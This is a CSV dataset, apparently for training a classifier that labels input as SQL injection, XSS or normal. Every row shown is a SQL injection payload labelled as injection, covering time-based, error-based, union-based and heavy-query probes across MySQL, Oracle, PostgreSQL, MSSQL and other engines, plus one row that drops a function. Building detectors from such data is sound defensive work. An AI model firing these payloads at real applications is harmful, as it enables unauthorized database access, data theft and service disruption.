Sentence,SQLInjection,XSS,Normal
"1'  )  )   )  or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and   (  (   ( 'dqjq' = 'dqjq",1,0,0
"1%' or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and '%' = '",1,0,0
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  (  '%' = '",1,0,0
1' )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and  ( 'dqoz' like 'dqoz,1,0,0
1  )  )   )  and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and   (  (   ( 1601 = 1601,1,0,0
"-4166%"" )  union all select 5190--",1,0,0
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and   (  (  '%' = '",1,0,0
"1%""  )  )   and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,0,0
"1' )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and  ( 'nopu' = 'nopu",1,0,0
"1'  )  )   as rxhe where 3838 = 3838 or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,0,0
"1""  )  )   as hdyn where 6027 = 6027 union all select null,null,null--",1,0,0
"1' )  as wnyl where 8978 = 8978 or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,0,0
"1' or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ",1,0,0
"1'|| ( select 'jnsd' from dual where 2316 = 2316 union all select null,null,null,null,null,null,null#",1,0,0
"1%"" and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and ""%"" = """,1,0,0
1' )  and 6969 =  ( select 6969 from pg_sleep ( 5  )  )  ,1,0,0
1 where 8393 = 8393,1,0,0
"-2013""  )  )   as kisy where 3802 = 3802 or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",1,0,0
"1%"" or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and ""%"" = """,1,0,0
-7971' union all select 4273#,1,0,0
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""%"" = """,1,0,0
1'  )  )   and 2401 = 4693 and   (  (  'ssrm' = 'ssrm,1,0,0
"1"" and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) ",1,0,0
"1%""  )  )   and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (  ""%"" = """,1,0,0
-9657' )  as ziiq where 7725 = 7725 or 3038 = 3038,1,0,0
"-6599%""  )  )   or make_set ( 9354 = 9354,7185 )  and   (  (  ""%"" = """,1,0,0
"-2610%"" )  union all select 7779,7779,7779,7779,7779--",1,0,0
"1'+ ( select fhbk where 2570 = 2570 and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  )  +'",1,0,0
"1  )  )   or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (  8554 = 8554",1,0,0
"1%"" )  or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and  ( ""%"" = """,1,0,0
"1 )  where 7425 = 7425 union all select null,null,null,null,null,null,null,null,null,null--",1,0,0
"1'  )  )   and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,0,0
"1%' )  or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1,0,0
"-7233"" )  where 7574 = 7574 or 5821 = 3288",1,0,0
"-4927'  )  )   union all select 1924,1924#",1,0,0
"1 and elt ( 3114 = 3114,sleep ( 5  )  )  #",1,0,0
"1"" and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and ""rntg"" like ""rntg",1,0,0
"1""  )  )   and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and   (  (  ""ykhp"" like ""ykhp",1,0,0
"1' )  or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and  ( 'wdru' like 'wdru",1,0,0
"1%"" )  union all select null,null,null,null--",1,0,0
"1'|| ( select 'pvmz' from dual where 1090 = 1090 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1  )  )  ||'",1,0,0
"1"" )  and elt ( 1889 = 7397,7397 )  and  ( ""kuau"" = ""kuau",1,0,0
"1'  )  )   )  union all select null,null,null#",1,0,0
"waitfor delay '0:0:5' and   (  (   ( ""mfro"" like ""mfro",1,0,0
1  )  )   as zpvn where 2767 = 2767 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )  --,1,0,0
"-4964""  )  )   union all select 4750,4750,4750,4750,4750--",1,0,0
"1%' and elt ( 4249 = 4249,7259 )  and '%' = '",1,0,0
1  )  )   as ehlg where 6340 = 6340,1,0,0
"1, ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4250 = 4250 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) ",1,0,0
"select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )   and  ( 'qfsu' = 'qfsu",1,0,0
"select count ( * )  from generate_series ( 1,5000000 )  and   (  (   ( ""%"" = """,1,0,0
"1%""  )  )   )  and 3116 = 9088#",1,0,0
1'  )  )   and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (  'opyp' = 'opyp,1,0,0
"1%' )  or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and  ( '%' = '",1,0,0
"1 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) -- pvdw",1,0,0
"1 )  as rtpl where 1262 = 1262 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1,0,0
"1%' )  union all select null,null,null--",1,0,0
"1  )  )   as rpwt where 4103 = 4103 and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,0,0
-4108' )  or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and  ( 'tqjx' = 'tqjx,1,0,0
"1""  )  )   as itxo where 7916 = 7916",1,0,0
"1  )  )   or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,0,0
"1 where 5081 = 5081 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",1,0,0
1'+ ( select 'unpz' where 8186 = 8186,1,0,0
"-5124'+ ( select 'xpww' where 1752 = 1752 union all select 1752,1752,1752,1752,1752,1752,1752,1752,1752,1752--",1,0,0
"1"" )  where 9461 = 9461 union all select null,null,null,null,null,null,null,null,null#",1,0,0
1 )  as hvsk where 7902 = 7902,1,0,0
1' )  as bscn where 6907 = 6907,1,0,0
-7453'  )  )   )  or 8571 = 8571--,1,0,0
1' where 2134 = 2134 rlike  ( select  ( case when  ( 3613 = 2090 )  then 1 else 0x28 end  )  )  --,1,0,0
"1""  )  )   as vxkn where 2443 = 2443 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,0,0
select  ( case when  ( 5009 = 1133 )  then 5009 else 5009* ( select 5009 from information_schema.character_sets )  end ) #,1,0,0
"1  )  )   )  or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and   (  (   ( 1782 = 1782",1,0,0
"1"" )  procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and  ( ""hrkf"" like ""hrkf",1,0,0
-9358' or 9887 = 2569--,1,0,0
"1"" )  as evoq where 8193 = 8193 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",1,0,0
-7426' order by 1#,1,0,0
"1  )  )   as dnwj where 2961 = 2961 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,0,0
-9264' )  or 8571 = 8571--,1,0,0
-5291'  )  )   or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  'tmpm' = 'tmpm,1,0,0
"-4015"" where 2610 = 2610 or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1,0,0
"1 )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) ",1,0,0
1'  )  )   )  and 7533 = 7533 and   (  (   ( 'suzd' like 'suzd,1,0,0
"-6626%"" )  or 1744 = 5292 and  ( ""%"" = """,1,0,0
"1 )  as wxms where 7272 = 7272 and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,0,0
1 )  where 7552 = 7552 order by 1#,1,0,0
"1' )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and  ( 'szib' like 'szib",1,0,0
"1' )  as hats where 2011 = 2011 union all select null,null,null,null,null#",1,0,0
1'|| ( select 'tznb' from dual where 8808 = 8808 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #,1,0,0
-2174'  )  )   as zhoz where 4185 = 4185 order by 1#,1,0,0
1'  )  )   )  and 3602 = 1990#,1,0,0
"1 )  where 1013 = 1013 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --",1,0,0
1'+ ( select soqk where 5383 = 5383,1,0,0
"1'  )  )   )  and elt ( 9501 = 8427,8427 )  and   (  (   ( 'ahpp' = 'ahpp",1,0,0
"1""  )  )   and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,0,0
"1'|| ( select 'jlka' where 5436 = 5436 or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,0,0
"-4960 union all select 4031,4031#",1,0,0
"1"" where 1719 = 1719 and 7533 = 7533--",1,0,0
"-5798"" or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) ",1,0,0
"1'  )  )   )  and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and   (  (   ( 'gwew' like 'gwew",1,0,0
 select sleep ( 5 ) #,1,0,0
"1"" where 5440 = 5440 and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,0,0
"1' where 7353 = 7353 or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,0,0
-3496'  )  )   or 9323 = 9323#,1,0,0
1%'  )  )   )  and 3916 = 6327--,1,0,0
"1"" and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and ""exgr"" like ""exgr",1,0,0
"-1376%""  )  )   )  or 3458 = 9503 and   (  (   ( ""%"" = """,1,0,0
"1%"" and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,0,0
"1'  )  )   )  and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (   ( 'wzdo' = 'wzdo",1,0,0
1'  )  )   as vdhw where 8858 = 8858 order by 1#,1,0,0
1 )  where 8232 = 8232 and  ( 3020 = 3020 ) *6703--,1,0,0
"1"" )  where 6018 = 6018 and 7533 = 7533--",1,0,0
"1 )  or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( 9112 = 9112",1,0,0
-5555  )  )   as ldte where 4583 = 4583 order by 1#,1,0,0
-1886' where 5518 = 5518 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --,1,0,0
"1%""  )  )   )  and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,0,0
"1'  )  )   as atpy where 9020 = 9020 or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,0,0
"1%' )  and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,0,0
1' union all select null#,1,0,0
"1' and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and 'hzav' = 'hzav",1,0,0
1'|| ( select 'zccb' from dual where 8911 = 8911,1,0,0
"-3137'|| ( select 'btif' where 1718 = 1718 union all select 1718,1718,1718,1718,1718,1718,1718,1718,1718#",1,0,0
"-3819'  )  )   )  union all select 9014,9014,9014,9014,9014,9014--",1,0,0
"1%'  )  )   or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,0,0
"1' where 4149 = 4149 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1,0,0
"1 )  and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  ",1,0,0
1 where 2382 = 2382,1,0,0
"-2276""  )  )   as qwow where 2321 = 2321 or 3534 = 2971--",1,0,0
select  ( case when  ( 7997 = 1543 )  then 7997 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1,0,0
"1"" )  where 5129 = 5129 order by 1--",1,0,0
1 where 9404 = 9404,1,0,0
1' )  where 7252 = 7252,1,0,0
"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 and  ( 'fnon' like 'fnon",1,0,0
1 )  as nsdy where 7513 = 7513,1,0,0
"-9337 )  union all select 5648,5648,5648,5648,5648#",1,0,0
"-2734' )  union all select 5510,5510,5510,5510,5510#",1,0,0
"1"" )  as vcir where 6275 = 6275 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,0,0
"-7559"" or 8792 = 6905--",1,0,0
"1' and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and 'zetf' = 'zetf",1,0,0
"iif ( 8354 = 3515,1,1/0 ) ",1,0,0
"-2612"" )  as iwfj where 3231 = 3231 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --",1,0,0
"1'  )  )   and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (  'ygfv' = 'ygfv",1,0,0
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (   ( '%' = '",1,0,0
"-7945%'  )  )   )  union all select 4286,4286,4286,4286,4286,4286--",1,0,0
"-5998%"" )  union all select 2366,2366,2366,2366#",1,0,0
"1'|| ( select 'wqmz' where 6400 = 6400 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x  )  )  ||'",1,0,0
"1, ( select * from generate_series ( 5609,5609,case when  ( 5609 = 5609 )  then 1 else 0 end )  limit 1 ) ",1,0,0
"-6129 union all select 9122,9122#",1,0,0
"1'  )  )   )  and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( 'qfvg' = 'qfvg",1,0,0
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  (  ""swec"" like ""swec",1,0,0
"1""  )  )   rlike sleep ( 5 )  and   (  (  ""ahhx"" like ""ahhx",1,0,0
"1 )  where 7600 = 7600 union all select null,null,null,null,null,null--",1,0,0
"1' in boolean mode )  and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) #",1,0,0
1%'  )  )   )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #,1,0,0
"-5945'  )  )   )  union all select 4266,4266,4266,4266,4266--",1,0,0
"1 where 2674 = 2674 and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,0,0
"1"" )  as rcnk where 1800 = 1800",1,0,0
"-2701""  )  )   as wvht where 5401 = 5401 union all select 5401,5401,5401,5401,5401,5401,5401,5401#",1,0,0
"select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )   and   (  (  ""vcvb"" like ""vcvb",1,0,0
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( 8503 = 8503",1,0,0
"-9688%'  )  )   )  or elt ( 3695 = 7995,7995 )  and   (  (   ( '%' = '",1,0,0
"1  )  )   )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and   (  (   ( 8671 = 8671",1,0,0
1  )  )   as ewlg where 3722 = 3722 rlike sleep ( 5 ) --,1,0,0
 ( select 2412 =  ( 'qqpjq'|| ( select case 2412 when 2412 then 1 else 0 end from rdb$database ) ||'qzvzq'  )  )  ,1,0,0
-6890'  )  )   or 5771 = 7721--,1,0,0
if ( 9431 = 6730 )  select 9431 else drop function xbkh--,1,0,0
"1"" )  where 4739 = 4739 or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) --",1,0,0
"1' or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) ",1,0,0
"1"" )  and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and  ( ""vxec"" like ""vxec",1,0,0
"1' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and 'eznq' like 'eznq",1,0,0
1'|| ( select 'hwdj' where 8179 = 8179,1,0,0
1 )  as usnn where 3201 = 3201,1,0,0
select  ( case when  ( 9816 = 1693 )  then 9816 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1,0,0
"1%"" )  and 8715 = 5529",1,0,0
"1%' )  or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,0,0
"1  )  )   )  union all select null,null,null,null,null,null#",1,0,0
"1 )  where 3076 = 3076 union all select null,null,null,null,null--",1,0,0
select  ( case when  ( 9931 = 3424 )  then 1 else 9931* ( select 9931 from master..sysdatabases )  end ) --,1,0,0
"1"" )  and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and  ( ""liar"" = ""liar",1,0,0
1'+ ( select tzvm where 5145 = 5145 and 4192 = 7437#,1,0,0
"1""  )  )   as ydkd where 2455 = 2455 and sleep ( 5 ) --",1,0,0
"-4148%""  )  )   )  or  ( 8459 = 8459 ) *4906 and   (  (   ( ""%"" = """,1,0,0
 end and  ( 'nchh' = 'nchh,1,0,0
1' or sleep ( 5 ) #,1,0,0
"1"" )  or elt ( 6272 = 6272,sleep ( 5  )  )   and  ( ""dplf"" like ""dplf",1,0,0
-7239' or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and 'cswv' = 'cswv,1,0,0
"1'|| ( select 'xhqy' where 4531 = 4531 union all select null,null--",1,0,0
"-6746"" )  or  ( 8459 = 8459 ) *4906 and  ( ""kohi"" like ""kohi",1,0,0
"-6667%""  )  )   union all select 7348,7348,7348,7348,7348,7348,7348,7348#",1,0,0
"1%' or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and '%' = '",1,0,0
1'|| ( select 'yuku' where 7480 = 7480,1,0,0
"1' )  union all select null,null,null,null--",1,0,0
